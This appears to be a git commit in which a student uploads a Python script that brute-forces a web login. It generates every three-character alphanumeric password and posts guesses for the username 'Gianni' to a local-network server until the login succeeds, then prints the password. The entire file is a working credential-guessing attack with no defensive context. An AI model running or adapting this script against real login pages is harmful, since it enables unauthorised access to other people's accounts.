2c1057acb4e0ae1b46495f86c8cfc29cd766d294
LeMagni <72194498+LeMagni@users.noreply.github.com>
2022-03-24 06:23:45 +0100

    Add files via upload

---
+++ Brute Force Python/prova1 (1).py
@@ -0,0 +1,33 @@
+import socket as sck
+import requests
+import string
+from urllib import request
+import random
+
+INDIRIZZO="http://192.168.0.137:5000/"
+
+def main():
+    un="Gianni"
+    car=string.ascii_letters+string.digits
+    print(car)
+    passlist=[]
+    for k in car:
+        passBrut=k
+        for i in car:
+            passBrut=passBrut+i
+            for j in car:
+                passBrut=passBrut+j
+                passlist.append(passBrut)
+                passBrut=passBrut[:-1]
+            passBrut=passBrut[:-1]
+    while True:
+        password=passlist[random.randint(0,len(passlist)-1)]
+        r = requests.post(INDIRIZZO, data={"username":un, "password":password,"login":"Login"})
+        if(r.url!=INDIRIZZO):
+            break
+        else:
+            passlist.remove(password)
+    print(f"La password è: {password}")
+
+if __name__=="__main__":
+    main()
